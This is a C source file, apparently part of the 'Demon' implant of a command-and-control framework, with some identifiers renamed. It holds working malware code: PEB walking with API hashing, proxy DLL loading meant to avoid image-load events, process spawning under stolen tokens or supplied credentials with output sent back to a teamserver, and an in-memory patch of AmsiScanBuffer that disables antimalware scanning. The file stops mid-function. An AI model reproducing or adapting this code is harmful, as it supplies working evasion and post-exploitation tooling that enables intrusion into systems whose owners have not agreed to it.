#include <Demon.h>

#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/Package.h>
#include <core/Syscalls.h>
#include <common/Macros.h>
#include <common/Native.h>

/*!
 * Extended String Hasher
 * @param String
 * @param Length
 * @param Upper
 * @return
 */
ULONG HaExSH(
    IN PVOID String,
    IN ULONG Length,
    IN BOOL  Upper
) {
    ULONG  Hash = HASH_KEY;
    PUCHAR Ptr  = String;

    if ( ! String ) {
        return 0;
    }

    do {
        UCHAR chara = *Ptr;

        if ( ! Length ) {
            if ( ! * Ptr ) {
                break;
            }
        } else {
            if ( ( ULONG ) ( C_PTR( Ptr ) - String ) >= Length ) {
                break;
            }

            if ( !*Ptr ) {
                ++Ptr;
            }
        }

        if ( Upper ) {
            if ( chara >= 'a' ) {
                chara -= 0x20;
            }
        }

        Hash = ( ( Hash << 5 ) + Hash ) + chara;

        ++Ptr;
    } while ( TRUE );

    return Hash;
}

/*!
 * load Mod from PEB InLoadOrderModList by Hash
 * @param Hash
 * @return
 */
PVOID LoaderModPebbb(
    IN DWORD Hash
) {
    PLDR_DATA_TABLE_ENTRY leedar = NULL;
    PLIST_ENTRY		      hadaar = NULL;
    PLIST_ENTRY		      ENTRAA = NULL;
    PPEB			      pabb = NULL;

    /* Get pointer to list */
    if ( ! Instance->Teb ) {
        Instance->Teb = NtCurrentTeb();
    }

    pabb = Instance->Teb->ProcessEnvironmentBlock;
    hadaar = & pabb->Ldr->InLoadOrderModList;
    ENTRAA = hadaar->Flink;

    for ( ; hadaar != ENTRAA ; ENTRAA = ENTRAA->Flink ) {
        leedar = C_PTR( ENTRAA );

        /* Compare the DLL Name! */
        if ( ( HaExSH( leedar->BaseDllName.Buffer, leedar->BaseDllName.Length, TRUE ) == Hash ) || Hash == 0 ) {
            return leedar->DllBase;
        }
    }

    return NULL;
}

/*!
 * load Mod from PEB InLoadOrderModList by String
 * @param Mod name of Mod (needs to be upper case: Mod.DLL)
 * @return
 */
PVOID LoaderModPeBStr(
    IN LPWSTR Mod
) {
    PLDR_DATA_TABLE_ENTRY Ldr  = NULL;
    PLIST_ENTRY		      Hdr  = NULL;
    PLIST_ENTRY		      Ent  = NULL;
    PPEB			      Peb  = NULL;
    LPWSTR                Naamhota = { 0 };
    ULONG                 Index  = 0;

    /* Get pointer to list */
    if ( ! Instance->Teb ) {
        Instance->Teb = NtCurrentTeb();
    }

    Naamhota = MmHeapAlloc( MAX_PATH );

    Peb = Instance->Teb->ProcessEnvironmentBlock;
    Hdr = & Peb->Ldr->InLoadOrderModList;
    Ent = Hdr->Flink;

    for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
        Ldr = C_PTR( Ent );

        if ( Ldr->BaseDllName.Length <= 260 ) {

            MemCopy( Naamhota, Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length );

            /* turn the Mod name from PEB to upper */
            do {
                if ( Index < Ldr->BaseDllName.Length ) {
                    if ( Naamhota[ Index ] >= 'a' ) {
                        Naamhota[ Index ] -= 0x20;
                    }
                } else {
                    break;
                }

                Index++;
            } while ( TRUE );
            Index = 0;

            /* Compare the DLL Name! */
            if ( ( StringCompareW( Naamhota, Mod ) == 0 ) || Mod == NULL ) {
                return Ldr->DllBase;
            }

            MemZero( Naamhota, MAX_PATH );
        }
    }

    if ( Naamhota ) {
        MemZero( Naamhota, MAX_PATH );
        MmHeapFree( Naamhota );
        Naamhota = NULL;
    }

    return NULL;
}

/*!
 * Search for a DLL on the PEB Mod list
 *
 * @param ModNm Mod name
 * @return
 */
PVOID LoaderModSea(
    IN LPWSTR ModNm)
{
    PVOID                 Secondent  = NULL;
    PLDR_DATA_TABLE_ENTRY Ent       = NULL;
    WCHAR                 Name[ 260 ] = { 0 };
    WCHAR                 LLd[ 5 ]    = { 0 };

    LLd[ 3 ] = HideChar( 'L' );
    LLd[ 1 ] = HideChar( 'D' );
    LLd[ 4 ] = HideChar( '\0' );
    LLd[ 2 ] = HideChar( 'L' );
    LLd[ 0 ] = HideChar( '.' );

    Ent      = Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModList.Flink;
    Secondent = &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModList.Flink;

    StringCopyW( Name, ModNm );

    if ( ! EndsWithIW( ModNm, LLd ) )
    {
        StringConcatW( Name, LLd );
    }

    MemZero( LLd, sizeof( LLd ) );

    do
    {
        if ( ! StringCompareIW( Name, Ent->BaseDllName.Buffer ) ) {
            MemZero( Name, sizeof( Name ) );
            return Ent->DllBase;
        }
        Ent = Ent->InLoadOrderLinks.Flink;
    } while ( Ent != Secondent );

    MemZero( Name, sizeof( Name ) );
    return NULL;
}

/*!
 * Load Library by string name.
 *
 * @note
 *  based on how it is configured to load the Mod
 *  it either proxy calls LoadLibraryW using RtlRegisterWait/RtlCreateTimer/RtlQueueWorkItem
 *  or it directly uses LdrLoadDll.
 *
 * @param ModNm Mod name to load
 * @return
 */
PVOID LoaderModLod(
    IN LPSTR ModNm
) {
    UNICODE_STRING UnicodeString  = { 0 };
    WCHAR          NameW[ 260 ]   = { 0 };
    PVOID          Mod         = { 0 };
    USHORT         DestSize       = 0;
    HANDLE         Event          = NULL;
    HANDLE         Queue          = NULL;
    HANDLE         Timer          = NULL;
    DWORD          Count          = 5;
    NTSTATUS       NtStatus       = STATUS_SUCCESS;

    if ( ! ModNm ) {
        return NULL;
    }

    /* convert Mod ansi string to unicode string */
    CharStringToWCharString( NameW, ModNm, StringLengthA( ModNm ) );

    /* get size of Mod unicode string */
    DestSize = StringLengthW( NameW ) * sizeof( WCHAR );

    /* check if the Mod is already loaded */
    Mod = LoaderModSea( NameW );

    /* if found, avoid generating an image-load event */
    if ( Mod ) {
        return Mod;
    }

    /* if proxy Mod loading is enabled */
    if ( Instance->Config.Implant.ProxyLoading )
    {
        /* load library using RtlRegisterWait + LoadLibraryW */
        if ( ( Instance->Config.Implant.ProxyLoading == PROXYLOAD_RTLREGISTERWAIT ) && Instance->Win32.RtlRegisterWait )
        {
            PUTS( "Loading Mod using RtlRegisterWait" )

            /* create an event for end of Mod loading */
            if ( ! NT_SUCCESS( NtStatus = SysNtCreateEvent( &Event, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) ) {
                goto DEFAULT;
            }

            /* call LoadLibraryW */
            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlRegisterWait( &Timer, Event, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, WT_EXECUTEONLYONCE | WT_EXECUTEINWAITTHREAD ) ) ) {
                PRINTF( "RtlRegisterWait: %p\n", NtStatus )
                goto DEFAULT;
            }
        }

        /* load library using RtlCreateTimer + LoadLibraryW */
        else if ( ( Instance->Config.Implant.ProxyLoading == PROXYLOAD_RTLCREATETIMER ) && Instance->Win32.RtlCreateTimer )
        {
            PUTS( "Loading Mod using RtlCreateTimer" )

            /* create timer queue */
            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimerQueue( &Queue ) ) ) {
                PRINTF( "RtlCreateTimerQueue Failed => %p\n", NtStatus )
                goto DEFAULT;
            }

            /* call LoadLibraryW */
            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlCreateTimer( Queue, &Timer, C_PTR( Instance->Win32.LoadLibraryW ), NameW, 0, 0, WT_EXECUTEINTIMERTHREAD ) ) ) {
                PRINTF( "RtlCreateTimer: %p\n", NtStatus )
                goto DEFAULT;
            }
        }
        /* load library using RtlQueueWorkItem + LoadLibraryW */
        else if ( ( Instance->Config.Implant.ProxyLoading == PROXYLOAD_RTLQUEUEWORKITEM ) && Instance->Win32.RtlQueueWorkItem )
        {
            PUTS( "Loading Mod using RtlQueueWorkItem" )

            /* call LoadLibraryW and load specified Mod */
            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.RtlQueueWorkItem( C_PTR( Instance->Win32.LoadLibraryW ), NameW, WT_EXECUTEDEFAULT ) ) ) {
                PRINTF( "RtlQueueWorkItem Failed: %p\n", NtStatus )

                /* if we failed to load the Mod via RtlQueueWorkItem + LoadLibraryW then
                 * try to load it using LdrLoadDll */
                goto DEFAULT;
            }
        } else {
            goto DEFAULT;
        }


        do {
            /* after 5 times checking give up.
             * use LdrLoadDll instead */
            if ( ! Count ) {
                break;
            }

            /* now let's try to get the Mod
             * if we failed to load the Mod then try using LdrLoadDll
             * NOTE: we are getting the Mod by string because there are some hash collisions
             *       when using LdrModPeb */
            if ( ( Mod = LoaderModPeBStr( NameW ) ) ) {
                break;
            }

            /* a little delay between each PEB check */
            SharedSleep( 100 );

            /* decrease counter */
            Count--;
        } while ( TRUE );

        /* if Mod still hasn't been found then go to default */
        if ( ! Mod ) {
            PUTS( "Mod was not loaded, try with default technique" )
            goto DEFAULT;
        }
    }
    else
    {
    DEFAULT:
        /* load library using LdrLoadDll */
        if ( Instance->Win32.LdrLoadDll )
        {
            PUTS( "Loading Mod using LdrLoadDll" )

            /* prepare unicode string */
            UnicodeString.Buffer        = NameW;
            UnicodeString.Length        = DestSize;
            UnicodeString.MaximumLength = DestSize + sizeof( WCHAR );

            if ( ! NT_SUCCESS( NtStatus = Instance->Win32.LdrLoadDll( NULL, 0, &UnicodeString, &Mod ) ) ) {
                PRINTF( "LdrLoadDll Failed: %p\n", NtStatus )
                NtSetLastError( NtStatus );
            }
        }
    }

END:
    /* clear stuff from stack */
    MemZero( NameW, sizeof( NameW ) );
    MemZero( &UnicodeString, sizeof( UnicodeString ) );

    PRINTF( "Mod \"%s\": %p\n", ModNm, Mod )

    /* close event end */
    if ( Event ) {
        SysNtClose( Event );
        Event = NULL;
    }

    /* close queue */
    if ( Queue ) {
        Instance->Win32.RtlDeleteTimerQueue( Queue );
        Queue = NULL;
    }

    return Mod;
}

/*!
 * gets the function pointer
 * @param Mod
 * @param FunctionHash
 * @return
 */
PVOID LoaderFuncAdd(
    IN PVOID Mod,
    IN DWORD Hash
) {
    PIMAGE_NT_HEADERS       NtHeader         = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = { 0 };
    SIZE_T                  ExpDirectorySize = { 0 };
    PDWORD                  AddrOfFunctions  = { 0 };
    PDWORD                  AddrOfNames      = { 0 };
    PWORD                   AddrOfOrdinals   = { 0 };
    PVOID                   FunctionAddr     = { 0 };
    PCHAR                   FunctionName     = { 0 };
    ANSI_STRING             AnsiString       = { 0 };

    if ( ! Mod || ! Hash )
        return NULL;

    NtHeader         = C_PTR( Mod + ( ( PIMAGE_DOS_HEADER ) Mod )->e_lfanew );
    ExpDirectory     = C_PTR( Mod + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpDirectorySize = U_PTR( Mod + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );

    AddrOfNames      = C_PTR( Mod + ExpDirectory->AddressOfNames );
    AddrOfFunctions  = C_PTR( Mod + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals   = C_PTR( Mod + ExpDirectory->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
        FunctionName = ( PCHAR ) Mod + AddrOfNames[ i ];
        if ( HaExSH( FunctionName, 0, TRUE ) == Hash )
        {
            FunctionAddr = C_PTR( Mod + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );

            /* if this is a redirect function then use LdrGetProcedureAddress */
            if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ExpDirectory &&
                 ( ULONG_PTR ) FunctionAddr <  ( ULONG_PTR ) ExpDirectory + ExpDirectorySize )
            {
                AnsiString.Length        = StringLengthA( FunctionName );
                AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
                AnsiString.Buffer        = FunctionName;

                if ( Instance->Win32.LdrGetProcedureAddress ) {
                    if ( ! NT_SUCCESS( Instance->Win32.LdrGetProcedureAddress( Mod, &AnsiString, 0, &FunctionAddr ) ) ) {
                        return NULL;
                    }
                } else {
                    return NULL;
                }
            }

            return FunctionAddr;
        }
    }

    PRINTF( "API not found: FunctionHash:[%lx]\n", Hash )

    return NULL;
}

/*
 * Get the size of an NtApi by finding two consecutive syscalls
 * and returning the difference of their addresses.
 * This can't be static because it changes between releases.
 */
UINT32 GSystemcalsi(
    VOID
) {
    PVOID                   Mod           = Instance->Modules.Ntdll;
    PIMAGE_NT_HEADERS       NtHeader         = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = { 0 };
    SIZE_T                  ExpDirectorySize = { 0 };
    PDWORD                  AddrOfFunctions  = { 0 };
    PDWORD                  AddrOfNames      = { 0 };
    PWORD                   AddrOfOrdinals   = { 0 };
    PVOID                   FunctionAddr     = { 0 };
    PCHAR                   FunctionName     = { 0 };
    ANSI_STRING             AnsiString       = { 0 };
    PVOID                   Addr1            = NULL;
    PVOID                   Addr2            = NULL;
    UINT32                  SyscallSize      = 0;
    UINT32                  Offset           = 0;

    if ( ! Mod )
        return 0;

    if ( Instance->Syscall.Size )
        return Instance->Syscall.Size;

    NtHeader         = C_PTR( Mod + ( ( PIMAGE_DOS_HEADER ) Mod )->e_lfanew );
    ExpDirectory     = C_PTR( Mod + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpDirectorySize = U_PTR( Mod + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );

    AddrOfNames      = C_PTR( Mod + ExpDirectory->AddressOfNames );
    AddrOfFunctions  = C_PTR( Mod + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals   = C_PTR( Mod + ExpDirectory->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
        /* ignore redirect functions */
        if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ExpDirectory &&
             ( ULONG_PTR ) FunctionAddr <  ( ULONG_PTR ) ExpDirectory + ExpDirectorySize )
            continue;

        // make sure is a system call
        FunctionName = ( PCHAR ) Mod + AddrOfNames[ i ];
        if (*(USHORT*)FunctionName != 0x775a)
            continue;

        // save one random syscall addr
        if ( ! Addr1 )
        {
            Addr1 = C_PTR( Mod + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
            continue;
        }
        else
        {
            // get the distance between our saved syscall addr and this one
            Addr2  = C_PTR( Mod + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
            Offset = ( ULONG_PTR ) Addr1 > ( ULONG_PTR ) Addr2 ? ( ULONG_PTR ) Addr1 - ( ULONG_PTR ) Addr2 : ( ULONG_PTR ) Addr2 - ( ULONG_PTR ) Addr1;

            // if the distance is the smallest we have seen so far, save it
            if ( ! SyscallSize || Offset < SyscallSize ) {
                SyscallSize = Offset;
            }
        }
    }

    // by now, we should have the size of a syscall stub
    Instance->Syscall.Size = SyscallSize;

    return Instance->Syscall.Size;
}

/*!
 * opens a handle to the specified pid with specified access
 * @param ProcessID
 * @param Access
 * @return
 */
HANDLE ProcessOpen(
    IN DWORD Pid,
    IN DWORD Access
) {
    HANDLE    Process  = NULL;
    CLIENT_ID Client   = { 0 };
    OBJ_ATTR  ObjAttr  = { 0 };
    NTSTATUS  NtStatus = STATUS_SUCCESS;

    InitializeObjectAttributes( &ObjAttr, NULL, 0, NULL, NULL );

    /* set our target process */
    Client.UniqueProcess = C_PTR( Pid );

    /* open process handle */
    if ( ! NT_SUCCESS( NtStatus = SysNtOpenProcess( &Process, Access, &ObjAttr, &Client ) ) ) {
        PRINTF( "NtOpenProcess Failed => %lx\n", NtStatus )
        NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
        return NULL;
    }

    return Process;
}

/*!
 * checks if a process runs under Wow64
 * @param Process
 * @return
 */
BOOL ProcessIsWow(
    IN HANDLE Process
) {
    PVOID    IsWow64  = NULL;
    NTSTATUS NtStatus = STATUS_SUCCESS;

    if ( ! Process ) {
        return FALSE;
    }

    if ( Instance->Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ) {
        return FALSE;
    }

    if ( ! NT_SUCCESS( NtStatus = SysNtQueryInformationProcess( Process, ProcessWow64Information, &IsWow64, sizeof( PVOID ), NULL ) ) ) {
        PRINTF( "[!] NtQueryInformationProcess Failed: Handle[%x] Status[%lx]\n", Process, NtStatus )
        return FALSE;
    }

    return U_PTR( IsWow64 );
}

/*!
 * Starts a Process
 *
 * @param x86 start 32-bit/wow64 process
 * @param App App path
 * @param CmdLine Process to run
 * @param Flags Process Flags
 * @param ProcessInfo Process Information struct
 * @param Piped Send output back
 * @param AnonPipes Uses Anon pipe struct as default pipe. only works if Piped is to False
 * @brief Spawns a process with current set settings (ppid spoof, blockdll, token)
 * @return
 */
BOOL ProcessCreate(
    IN  BOOL                 x86,
    IN  LPWSTR               App,
    IN  LPWSTR               CmdLine,
    IN  DWORD                Flags,
    OUT PROCESS_INFORMATION* ProcessInfo,
    IN  BOOL                 Piped,
    IN  PANONPIPE            DataAnonPipes
) {
    PPACKAGE        Package            = NULL;
    PANONPIPE       AnonPipe           = { 0 };
    STARTUPINFOW    StartUpInfo        = { 0 };
    BOOL            Return             = TRUE;
    PVOID           Wow64Value         = NULL;
    BOOL            DisabledWow64Redir = FALSE;
    BOOL            DisabledImp        = FALSE;
    HANDLE          PrimaryToken       = NULL;

    StartUpInfo.cb          = sizeof( STARTUPINFOA );
    StartUpInfo.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    StartUpInfo.wShowWindow = SW_HIDE;

    Package = PackageCreate( DEMON_INFO );
    PkgAdIn32( Package, DEMON_INFO_PROC_CREATE );

    if ( Piped )
    {
        PUTS( "Piped enabled" )
        AnonPipe = Instance->Win32.LocalAlloc( LPTR, sizeof( ANONPIPE ) );
        MemSet( AnonPipe, 0, sizeof( ANONPIPE ) );
        AnonPipesInit( AnonPipe );

        StartUpInfo.hStdError  = AnonPipe->StdOutWrite;
        StartUpInfo.hStdOutput = AnonPipe->StdOutWrite;
        StartUpInfo.hStdInput  = NULL;
    }

    if ( DataAnonPipes ) {
        PUTS( "Using specified anon pipes" )
        StartUpInfo.hStdError  = DataAnonPipes->StdOutWrite;
        StartUpInfo.hStdOutput = DataAnonPipes->StdOutWrite;
        StartUpInfo.hStdInput  = NULL;
    }

#if _M_IX86
    if ( ! x86 && Instance->Win32.Wow64DisableWow64FsRedirection )
    {
        PUTS( "Enable Wow64 process support" )
        if ( ! Instance->Win32.Wow64DisableWow64FsRedirection( &Wow64Value ) )
        {
            PRINTF( "Failed to disable wow64 redirection: %d : %x\n", NtGetLastError(), Wow64Value )
            PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            Return = FALSE;
            goto Cleanup;
        }

        DisabledWow64Redir = TRUE;
    }
#endif

    if ( Instance->Tokens.Impersonate )
    {
        PUTS( "Impersonate" )

        LPWSTR lpCurrentDirectory   = NULL;
        WCHAR  Path[ MAX_PATH * 2 ] = { 0 };

        if ( Instance->Win32.GetCurrentDirectoryW( MAX_PATH * 2, Path ) ) {
            lpCurrentDirectory = Path;
        }

        DisabledImp = TRUE;
        TokenImpersonate( FALSE );
        TokenSetSeImpersonatePriv( TRUE );

        PRINTF( "CmdLine           : %ls\n", CmdLine )
        PRINTF( "lpCurrentDirectory: %ls\n", lpCurrentDirectory )

        if ( Instance->Tokens.Token->Type == TOKEN_TYPE_STOLEN )
        {
            // Duplicate to make primary token (try delegation first)
            if ( ! SysDuplicateTokenEx( Instance->Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &PrimaryToken ) )
            {
                if ( ! SysDuplicateTokenEx( Instance->Tokens.Token->Handle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &PrimaryToken ) )
                {
                    PRINTF( "Failed to duplicate token [%d]\n", NtGetLastError() );
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    Return = FALSE;
                    goto Cleanup;
                }
            }

            PUTS( "CreateProcessWithTokenW" )
            if ( ! Instance->Win32.CreateProcessWithTokenW(
                    PrimaryToken,
                    LOGON_NETCREDENTIALS_ONLY,
                    App,
                    CmdLine,
                    Flags | CREATE_NO_WINDOW,
                    NULL,
                    lpCurrentDirectory,
                    &StartUpInfo,
                    ProcessInfo
            )
                    )
            {
                PRINTF( "CreateProcessWithTokenW: Failed [%d]\n", NtGetLastError() );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                Return = FALSE;
                goto Cleanup;
            }
        }
        else if ( Instance->Tokens.Token->Type == TOKEN_TYPE_MAKE_NETWORK )
        {
            PUTS( "CreateProcessWithLogonW" )
            PRINTF( "lpUser[%s] lpDomain[%s] lpPassword[%s]", Instance->Tokens.Token->lpUser, Instance->Tokens.Token->lpDomain, Instance->Tokens.Token->lpPassword )
            if ( ! Instance->Win32.CreateProcessWithLogonW(
                    Instance->Tokens.Token->lpUser,
                    Instance->Tokens.Token->lpDomain,
                    Instance->Tokens.Token->lpPassword,
                    LOGON_NETCREDENTIALS_ONLY,
                    App,
                    CmdLine,
                    Flags | CREATE_NO_WINDOW,
                    NULL,
                    lpCurrentDirectory,
                    &StartUpInfo,
                    ProcessInfo
            ) ) {
                PRINTF( "CreateProcessWithLogonW: Failed [%d]\n", NtGetLastError() );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                Return = FALSE;
                goto Cleanup;
            }
        }
    }
    else
    {
        if ( ! Instance->Win32.CreateProcessW(
                App,
                CmdLine,
                NULL,
                NULL,
                TRUE,
                Flags | CREATE_NO_WINDOW,
                NULL,
                NULL,
                &StartUpInfo,
                ProcessInfo
        ) ) {
            PRINTF( "CreateProcessA: Failed [%d]\n", NtGetLastError() );
            PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            Return = FALSE;
            goto Cleanup;
        }
    }

    /* Check if we managed to spawn a process */
    if ( ProcessInfo->hProcess && Instance->Config.Implant.Verbose )
    {
        PUTS( "Send info back" )
        if ( ! CmdLine )
        {
            PackageAddWString( Package, App );
            PkgAdIn32( Package, ProcessInfo->dwProcessId );
            PackageTransmit( Package );
        }
        else
        {
            INT32 i  = 0;
            INT32 x  = ( INT32 ) StringLengthW( CmdLine );
            PWCHAR s = Instance->Win32.LocalAlloc( LPTR, x * sizeof( WCHAR ) );

            MemCopy( s, CmdLine, x );

            // remove the arguments. we are just interested in the process name/path
            for ( ; i < x; i++ ) {
                if ( s[ i ] == ' ' ) break;
            } PUTS( s )
            s[ i ] = 0;

            PRINTF( "Process start :: Path:[%ls] ProcessId:[%d]\n", s, ProcessInfo->dwProcessId );

            PackageAddWString( Package, s );
            PkgAdIn32( Package, ProcessInfo->dwProcessId );
            PackageTransmit( Package );

            DATA_FREE( s, x );
        }
    }

    Cleanup:
#if _M_IX86
    if ( DisabledWow64Redir ) {
        Instance->Win32.Wow64RevertWow64FsRedirection( Wow64Value );
    }
#endif

    if ( Return && Piped ) {
        JobAdd( Instance->CurrentRequestID, ProcessInfo->dwProcessId, JOB_TYPE_TRACK_PROCESS, JOB_STATE_RUNNING, ProcessInfo->hProcess, AnonPipe );
    }
    else if ( ! Return && Piped )
    {
        if ( AnonPipe->StdOutWrite ) {
            SysNtClose( AnonPipe->StdOutWrite );
            AnonPipe->StdOutWrite = NULL;
        }

        if ( AnonPipe->StdOutRead ) {
            SysNtClose( AnonPipe->StdOutRead );
            AnonPipe->StdOutRead = NULL;
        }

        DATA_FREE( AnonPipe, sizeof( ANONPIPE ) );
    }

    if ( PrimaryToken ) {
        SysNtClose( PrimaryToken );
    }

    if ( DisabledImp ) {
        TokenImpersonate( TRUE );
    }

    return Return;
}

BOOL ProcessTerminate(
    IN HANDLE hProcess,
    IN DWORD  Pid)
{
    BOOL     Success      = FALSE;
    BOOL     OpenedHandle = FALSE;
    NTSTATUS NtStatus     = STATUS_UNSUCCESSFUL;

    if ( ! hProcess ) {
        if ( ( hProcess = ProcessOpen( Pid, PROCESS_TERMINATE ) ) == NULL ) {
            PRINTF( "[INJECT] Failed to open process handle: %d\n", NtGetLastError() )
            hProcess = NULL;
            goto END;
        } else {
            PRINTF( "[INJECT] Opened process handle to %d: %x\n", Pid, hProcess )
            OpenedHandle = TRUE;
        }
    } else {
        PRINTF( "[INJECT] Using specified process handle: %x\n", hProcess )
    }

    NtStatus = SysNtTerminateProcess( hProcess, STATUS_SUCCESS );
    if ( NT_SUCCESS( NtStatus ) ) {
        Success = TRUE;
    } else {
        PUTS( "Failed to terminate process" )
    }

END:
    if ( OpenedHandle ) {
        SysNtClose( hProcess );
    }

    return Success;
}

/*!
 * takes a snapshot of current running processes
 * @param SnapShot
 * @param Size
 * @return
 */
NTSTATUS ProcessSnapShot(
    OUT PSYSTEM_PROCESS_INFORMATION* SnapShot,
    OUT PSIZE_T                      Size
) {
    ULONG    Length   = 0;
    NTSTATUS NtStatus = STATUS_SUCCESS;

    if ( ! SnapShot || ! Size ) {
        return STATUS_INVALID_PARAMETER;
    }

    /* Get our system process list */
    if ( ! NT_SUCCESS( NtStatus = SysNtQuerySystemInformation( SystemProcessInformation, NULL, 0, &Length ) ) )
    {
        PRINTF( "SystemProcessInformation Length: %d\n", Length );

        /* just in case that some processes or threads where created between our calls */
        Length += 0x1000;

        /* allocate memory */
        *SnapShot = MmHeapAlloc( Length );
        if ( *SnapShot ) {
            if ( ! NT_SUCCESS( NtStatus = SysNtQuerySystemInformation( SystemProcessInformation, *SnapShot, Length, &Length ) ) ) {
                PRINTF( "NtQuerySystemInformation Failed: Status[%lx]\n", NtStatus )
                goto LEAVE;
            }
        } else NtStatus = STATUS_NO_MEMORY;

        *Size = Length;
    } else {
        /* we expected to fail. something doesn't seem right... */
        NtStatus = STATUS_INVALID_PARAMETER;
    }

    LEAVE:
    return NtStatus;
}

BOOL ReadLocalFile(
    IN  LPCWSTR FileName,
    OUT PVOID*  FileContent,
    OUT PDWORD  FileSize
) {
    BOOL   Success = FALSE;
    DWORD  Read    = 0;
    HANDLE hFile   = NULL;

    hFile = Instance->Win32.CreateFileW( FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
    if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) ) {
        PUTS( "CreateFileW: Failed" )
        PACKAGE_ERROR_WIN32
        goto Cleanup;
    }

    *FileSize    = Instance->Win32.GetFileSize( hFile, 0 );
    *FileContent = Instance->Win32.LocalAlloc( LPTR, *FileSize );

    if ( ! Instance->Win32.ReadFile( hFile, *FileContent, *FileSize, &Read, NULL ) ) {
        PUTS( "ReadFile: Failed" )
        PACKAGE_ERROR_WIN32
        goto Cleanup;
    }

    Success = TRUE;

    Cleanup:
    if ( hFile ) {
        SysNtClose( hFile );
        hFile = NULL;
    }

    if ( ! Success && *FileContent ) {
        Instance->Win32.LocalFree( *FileContent );
        *FileContent = NULL;
        *FileSize    = 0;
    }

    return Success;
}

/* Patch AMSI
 * TODO: remove this and replace it with hardware breakpoints */
BOOL BypassPatchAMSI(
    VOID
) {
    HINSTANCE hModAmsi   = NULL;
    LPVOID pAddress         = NULL;
    CHAR Mod[10]         = { 0 };

#ifdef _M_AMD64
    UCHAR amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; //x64
#elif defined(_M_IX86)
    unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
#endif

    Mod[0] = HideChar('A');
    Mod[1] = HideChar('M');
    Mod[2] = HideChar('S');
    Mod[3] = HideChar('I');
    Mod[4] = HideChar('.');
    Mod[5] = HideChar('D');
    Mod[6] = HideChar('L');
    Mod[7] = HideChar('L');
    Mod[8] = HideChar('\0');

    hModAmsi = LoaderModLod( Mod );
    MemZero( Mod, sizeof( Mod ) );

    PRINTF( "[+] Loaded asmi.dll: %p\n", hModAmsi );

    pAddress = LoaderFuncAdd( hModAmsi, H_FUNC_AMSISCANBUFFER );
    if( pAddress == NULL )
        return 0;

    PRINTF("[+] asmi function: %p\n", pAddress);

    LPVOID lpBaseAddress = pAddress;
    ULONG  OldProtection, NewProtection;
    SIZE_T uSize = sizeof(amsiPatch);

    if ( NT_SUCCESS( SysNtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection ) ) ) {
        MemCopy( pAddress, amsiPatch, sizeof(amsiPatch) );

        if ( NT_SUCCESS( SysNtProtectVirtualMemory( NtCurrentProcess(), (PVOID)&lpBaseAddress, &uSize, OldProtection, &NewProtection ) ) ) {
            return TRUE;
        }

        PUTS( "[-] Failed to change back protection" )
    }

    return FALSE;
}

BOOL AnonPipesInit(
    IN PANONPIPE AnonPipes
) {
    SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    if ( ! Instance->Win32.CreatePipe( &AnonPipes->StdOutRead, &AnonPipes->StdOutWrite, &SecurityAttr, 0 ) ) {
        PACKAGE_ERROR_WIN32
        return FALSE;
    }

    return TRUE;
}

/*!
 * reads from the specified anonymous pipe and
 * sends the result back to the teamserver
 * @param AnonPipes
 * @param RequestID
 */
VOID AnonPipesRead(
    IN PANONPIPE AnonPipes,
    IN UINT32 RequestID
) {
    PPACKAGE Package         = NULL;
    BOOL     Success         = FALSE;
    LPVOID   Buffer          = NULL;
    UCHAR    buf[ 1024 ]     = { 0 };
    DWORD    dwBufferSize    = 0;
    DWORD    dwRead          = 0;

    PUTS( "Start reading anon pipe" )
    PRINTF( "AnonPipes->StdOutRead => %x\n", AnonPipes->StdOutRead )

